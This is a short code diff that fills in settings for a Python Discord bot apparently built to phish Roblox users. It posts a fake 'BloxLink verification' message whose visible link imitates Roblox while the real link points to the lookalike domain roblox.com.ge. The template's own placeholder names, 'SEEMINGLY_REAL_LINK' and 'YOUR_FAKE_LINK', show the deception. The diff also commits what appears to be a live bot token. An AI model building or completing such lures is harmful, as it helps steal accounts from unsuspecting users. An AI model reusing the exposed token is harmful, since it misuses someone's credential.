@@ -4,13 +4,13 @@ from discord.ext import commands
 intents = discord.Intents.all()
 
 # Settings (Change these to whatever you want)
-token = "YOUR_BOT_TOKEN"
+token = "MTQ4OTQ5OTEzNjg2MzYzMzUxOA.Goap7o.ZbKe5J6yTt9YLLeI6siMR08N_48BanptJw3zw4"
 prefix = "!"
 title = "Please Complete Verification"
 desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
 field = "Please Login and join the game!"
-hyperlink = "SEEMINGLY_REAL_LINK"
-fake_link = "YOUR_FAKE_LINK"
+hyperlink = "https.//www.roblox.com/games/11468876235/Bloxlink-Verification?"
+fake_link = "https://roblox.com.ge/games/11468876235/Bloxlink-Verification?privateServerLinkCode=84173018134933438410597946522562"
 
 client = commands.Bot(command_prefix=prefix, intents=intents)
 client.remove_command('help')
